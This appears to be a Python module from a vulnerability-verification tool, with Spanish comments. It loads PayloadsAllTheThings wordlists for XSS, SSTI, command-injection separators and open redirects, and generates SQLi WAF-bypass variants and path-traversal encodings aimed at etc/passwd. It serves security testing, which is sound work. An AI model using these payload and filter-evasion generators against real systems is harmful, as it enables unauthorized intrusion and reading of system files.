"""Payload knowledge-base: carga wordlists REALES de PayloadsAllTheThings committeadas en
`payload_kb/` (ver `payload_kb/ATTRIBUTION.md`) y las generaliza: cada linea trae un marcador fijo
de los propios autores (un `alert(NNNN)` concreto, un `7*7` concreto, un host `google.com`
concreto...) que aqui se sustituye por el canario/secreto/host ALEATORIO que cada verificador
genera en su propia ejecucion -- nunca se manda una linea tal cual contra un objetivo real.

Esto es la integracion de verdad que faltaba: antes del commit que introdujo este modulo, la
casuistica de los verificadores citaba PayloadsAllTheThings en los comentarios pero solo un
punado de variantes elegidas a mano estaban en el codigo. Aqui se parsean los ficheros COMPLETOS
(cientos de lineas cada uno) y se usan TODAS las que se puedan generalizar de forma segura -- las
que apuntan a infraestructura de pruebas de terceros de los propios autores (dominios como
crowdshield.com/xerosecurity.com) se descartan explicitamente, nunca se manda trafico a un
servicio externo que no sea el propio laboratorio efimero."""
from __future__ import annotations

import os
import re
import urllib.parse
from typing import List

_DATA_DIR = os.path.join(os.path.dirname(__file__), "payload_kb")

# dominios de infraestructura de pruebas OOB de los propios autores de PayloadsAllTheThings --
# cualquier linea que los mencione se descarta al parsear, nunca se replica contra un objetivo.
_THIRD_PARTY_DOMAINS = ("crowdshield.com", "xerosecurity.com")


def _read_lines(filename: str) -> List[str]:
    path = os.path.join(_DATA_DIR, filename)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [ln.rstrip("\n").rstrip("\r") for ln in f]
    except OSError:
        return []


def _no_third_party(line: str) -> bool:
    low = line.lower()
    return not any(d in low for d in _THIRD_PARTY_DOMAINS)


def load_xss_payloads(js_marker_call: str) -> List[str]:
    """Parsea xss_alert_identifiable.txt (667 lineas reales): cada linea trae un `alert(NNNN)`
    con un numero fijo elegido por los autores -- se sustituye por `js_marker_call` (el
    `document.title='...'` del verificador, con el marcador aleatorio de ESTA ejecucion) en
    TODAS las lineas que lo traigan, generalizando el fichero completo de una vez."""
    out = []
    pattern = re.compile(r"alert\(\d+\)")
    for line in _read_lines("xss_alert_identifiable.txt"):
        if not line.strip() or not _no_third_party(line):
            continue
        if pattern.search(line):
            out.append(pattern.sub(js_marker_call, line))
    return out


# plantillas de aritmetica SSTI reales en ssti.fuzz, generalizadas: cada regex captura los dos
# operandos fijos de la linea original para poder sustituirlos por los propios de esta ejecucion,
# conservando el separador/sintaxis exacta de cada motor (Jinja2/Twig, ERB, Smarty-like,
# Velocity-like, ASP classic, Ruby). Las lineas de ssti.fuzz que son cadenas de RCE/exfiltracion
# (popen, subclasses, filter('system')...) no se generalizan aqui -- esa es una clase de prueba
# distinta (ejecucion de comandos via el motor de plantillas, no aritmetica), fuera de alcance de
# esta extraccion; la aritmetica demuestra evaluacion real sin ejecutar nada en el objetivo.
_SSTI_ARITH_PATTERNS = [
    (re.compile(r"\{\{(\d+)\*(\d+)\}\}"), "mul", "{{{{{a}*{b}}}}}"),
    (re.compile(r"\{\{(\d+)\*'(\d+)'\}\}"), "mul", "{{{{{a}*'{b}'}}}}"),
    (re.compile(r"<%=\s*(\d+)\s*\*\s*(\d+)\s*%>"), "mul", "<%= {a} * {b} %>"),
    (re.compile(r"\$\{(\d+)\*(\d+)\}"), "mul", "${{{a}*{b}}}"),
    (re.compile(r"\$\{\{(\d+)\*(\d+)\}\}"), "mul", "${{{{{a}*{b}}}}}"),
    (re.compile(r"@\((\d+)\+(\d+)\)"), "add", "@({a}+{b})"),
    (re.compile(r"#\{(\d+)\*(\d+)\}"), "mul", "#{{{a}*{b}}}"),
    (re.compile(r"#\{\s*(\d+)\s*\*\s*(\d+)\s*\}"), "mul", "#{{ {a} * {b} }}"),
]


def load_ssti_arithmetic_payloads(a: int, b: int) -> List[tuple]:
    """Parsea ssti.fuzz y genera, para cada plantilla aritmetica real que reconoce, la variante
    con los operandos `a`/`b` de ESTA ejecucion. Devuelve una lista de (payload, resultado
    esperado) -- 'mul' usa a*b (coincide con el resto de plantillas aritmeticas ya existentes en
    verify_wordpress_ssti), 'add' usa a+b (el unico motor de esta lista, ASP classic via @(), que
    solo trae un ejemplo con '+' en el propio fichero)."""
    lines = _read_lines("ssti.fuzz")
    seen_templates = set()
    out = []
    for line in lines:
        if not line.strip() or not _no_third_party(line):
            continue
        for pattern, op, template in _SSTI_ARITH_PATTERNS:
            if pattern.search(line) and template not in seen_templates:
                seen_templates.add(template)
                expected = a * b if op == "mul" else a + b
                out.append((template.format(a=a, b=b), expected))
    return out


# command_exec.txt/command-execution-unix.txt mezclan separadores puros (listos para usar tal
# cual) con payloads de comando completo ('dir C:\Users', peticiones a dominios de terceros,
# webshells PHP que escriben fichero) -- solo los primeros se pueden generalizar sin riesgo:
# un separador puro, al no tener NINGUNA letra fuera del alfabeto hex/escape tipico de un
# separador de shell, no puede ser por accidente un nombre de comando real. Limite de longitud
# para no colar frases largas que coincidieran por casualidad con el alfabeto permitido.
_CMD_SEP_RE = re.compile(r"[;|&`'\"%0-9a-dA-D\(\)\$\{\}\\]+")


def load_command_injection_separators() -> List[str]:
    """Parsea command_exec.txt + command-execution-unix.txt y devuelve SOLO las lineas que son
    separadores de shell puros (sin ningun comando incrustado) -- listas para anteponer al propio
    comando del verificador (`echo <secreto> > <canario>`)."""
    out = []
    seen = set()
    for fname in ("command_exec.txt", "command-execution-unix.txt"):
        for line in _read_lines(fname):
            s = line.strip()
            if not s or not _no_third_party(s):
                continue
            compact = s.replace(" ", "")
            if len(compact) > 12 or not compact:
                continue
            if _CMD_SEP_RE.fullmatch(compact) is None:
                continue
            if compact in seen:
                continue
            seen.add(compact)
            out.append(s)
    return out


# Open-Redirect-payloads.txt/openredirects.txt/open_redirect_wordlist.txt usan un host de
# relleno fijo (google.com/whitelisteddomain.tld/example.com, con o sin 'www.') -- se sustituye
# por evil_host (el dominio unico de ESTA ejecucion, ver verify_*_open_redirect). Se descartan
# las lineas con '?'/'&' (son plantillas de VARIOS parametros de redireccion a la vez -- un
# formato de ataque distinto, el endpoint probaria varios nombres de parametro en la misma
# peticion, no encaja con el modelo de "un valor para un parametro" que usan los verificadores).
_REDIRECT_PLACEHOLDER_HOSTS = ("www.whitelisteddomain.tld", "whitelisteddomain.tld",
                               "www.google.com", "google.com", "www.example.com", "example.com")


def load_open_redirect_templates(evil_host: str) -> List[str]:
    """Parsea las 3 wordlists de Open Redirect y devuelve TODAS las variantes generalizables
    (sustituyendo el host de relleno de los autores por `evil_host`) -- listas para usar como
    valor del parametro de redireccion."""
    out = []
    seen = set()
    for fname in ("Open-Redirect-payloads.txt", "openredirects.txt", "open_redirect_wordlist.txt"):
        for line in _read_lines(fname):
            s = line.strip()
            if not s or not _no_third_party(s) or "?" in s or "&" in s:
                continue
            # algunas lineas traen MAS DE UN host de relleno a la vez (p.ej. el truco de
            # userinfo "www.whitelisteddomain.tld@google.com/..."): hay que sustituir TODAS las
            # ocurrencias de TODOS los placeholders, no solo el primero que aparezca, o el otro
            # se cuela literal en el payload final.
            matched = False
            replaced = s
            for host in _REDIRECT_PLACEHOLDER_HOSTS:
                if host in replaced:
                    replaced = replaced.replace(host, evil_host)
                    matched = True
            if matched and replaced not in seen:
                seen.add(replaced)
                out.append(replaced)
    return out


# ---------------------------------------------------------------------------
# WAF bypass: SQLi expression encoding variants
# ---------------------------------------------------------------------------
# Genera variantes de bypass de WAF para una expresion SQL dada (p.ej. SLEEP(4)).
# Tecnicas:
#   case: variacion de mayusculas/minusculas  (SLeeP(4))
#   comment: comentarios inline MySQL          (SL/**/EEP(4))
#   plus:    concatenacion MySQL via +         (SL+EEP(4)) [MySQL specific]
#   percent: URL-encoding de un caracter       (SL%45EP(4))
#   double:  doble URL-encoding                (SL%2545EP(4))
#
# Las variantes se mantienen sin evaluar: el llamador decide cuales probar.
# No se generan variantes que involucren caracteres control/null que no sean
# semanticamente equivalentes en MySQL/Postgres.

def load_sqli_waf_bypass_variants(expression: str) -> List[str]:
    """Genera variantes de bypass de WAF para `expression` (p.ej. 'SLEEP(4)').

    Devuelve una lista DEDUPLICADA de variantes: maiusculas alternadas, comentarios
    inline MySQL (/**/) entre letras consecutivas de la palabra clave, URL-encoding
    de un caracter, y doble-encoding.  Nunca devuelve la expresion original tal cual
    -- el llamador ya la tiene y la prueba primero.
    """
    out: List[str] = []
    seen: set = set()

    def _add(v: str) -> None:
        if v and v != expression and v not in seen:
            seen.add(v)
            out.append(v)

    # 1. Case variation: alterna mayusculas en letras de la palabra clave
    # (funciona en MySQL y en la mayoria de bases de datos SQL insensibles a casos)
    cased = ""
    toggle = True
    for ch in expression:
        if ch.isalpha():
            cased += ch.upper() if toggle else ch.lower()
            toggle = not toggle
        else:
            cased += ch
    _add(cased)

    # 2. Inline MySQL comment after each letter of leading keyword
    # e.g. SLEEP(4) -> S/**/L/**/E/**/E/**/P/**/(4)
    # Solo se aplica a la primera secuencia alfa del payload (el nombre de funcion)
    m = re.match(r'^([A-Za-z_]+)(.*)', expression)
    if m:
        kw, rest = m.group(1), m.group(2)
        with_comments = "/**/".join(list(kw)) + rest
        _add(with_comments)
        # Version mas ligera: comentario solo al inicio de la palabra
        _add("/**/" + expression)

    # 3. URL-encode the first alpha character (simula bypass de IDS que no normaliza)
    for i, ch in enumerate(expression):
        if ch.isalpha():
            encoded_ch = urllib.parse.quote(ch, safe='')
            _add(expression[:i] + encoded_ch + expression[i + 1:])
            # Double-encoding
            _add(expression[:i] + urllib.parse.quote(encoded_ch, safe='') + expression[i + 1:])
            break

    # 4. MySQL whitespace bypass: tab \t y newline \n como sustitutos de espacio
    if " " in expression:
        _add(expression.replace(" ", "\t"))
        _add(expression.replace(" ", "\n"))
        _add(expression.replace(" ", "/**/"))

    return out


# ---------------------------------------------------------------------------
# WAF bypass: path traversal encoding variants
# ---------------------------------------------------------------------------
# Para LFI / path traversal: genera variantes de encoding del separador '../'
# y del payload completo, manteniendo la misma profundidad de directorio.
# Tecnicas:
#   double_dot:   ....//....// (doble punto + slash doble)
#   url_enc:      %2e%2e%2f (URL-encoding de ../)
#   double_enc:   %252e%252e%252f (doble URL-encoding)
#   null_byte:    ../../../etc/passwd%00 (null byte para truncar extension)
#   utf8:         ..%c0%af (overlong UTF-8 encoding de /)
#   win_path:     ..\..\ (rutas Windows con backslash)

def load_path_traversal_encodings(depth: int, target: str = "etc/passwd") -> List[str]:
    """Genera variantes de path traversal para `depth` niveles hacia el target.

    `depth`: numero de '../' que se concatenan (tipicamente 4-8)
    `target`: fichero destino sin '/' inicial (default 'etc/passwd')

    Devuelve una lista DEDUPLICADA de payloads listos para inyectar en el
    parametro de ruta del verificador.  El payload estandar '../' * depth +
    target ya lo genera el verificador -- estas son las variantes de encoding.
    """
    standard = "../" * depth + target
    out: List[str] = []
    seen: set = {standard}

    def _add(v: str) -> None:
        if v and v not in seen:
            seen.add(v)
            out.append(v)

    # 1. Double-dot double-slash: ....//  (elude filtros que solo eliminan '../')
    _add(("....//") * depth + target)

    # 2. URL-encoded separator: %2e%2e%2f
    url_sep = "%2e%2e%2f"
    _add(url_sep * depth + target)

    # 3. Mixed: ..%2f (solo el slash codificado)
    _add(("..%2f") * depth + target)

    # 4. Double URL-encoded: %252e%252e%252f
    double_sep = "%252e%252e%252f"
    _add(double_sep * depth + target)

    # 5. Null byte truncation (PHP < 5.3.4)
    _add(standard + "%00")
    _add(standard + "\x00")

    # 6. Overlong UTF-8 for /: %c0%af  (funciona en algunas implementaciones Java)
    _add(("..%c0%af") * depth + target)

    # 7. Windows paths (backslash)
    win_sep = "..\\"
    _add(win_sep * depth + target.replace("/", "\\"))
    _add(("..%5c") * depth + target.replace("/", "%5c"))

    # 8. URL-encode the full payload (doble encoding del payload completo)
    _add(urllib.parse.quote(standard, safe=''))

    # 9. Inject extra slashes: ./../ (elude algunos filtros que buscan '../')
    _add(("./../") * depth + target)

    # 10. Unicode separators: %u2215 (DIVISION SLASH, Windows IIS)
    _add(("..%u2215") * depth + target)

    return out
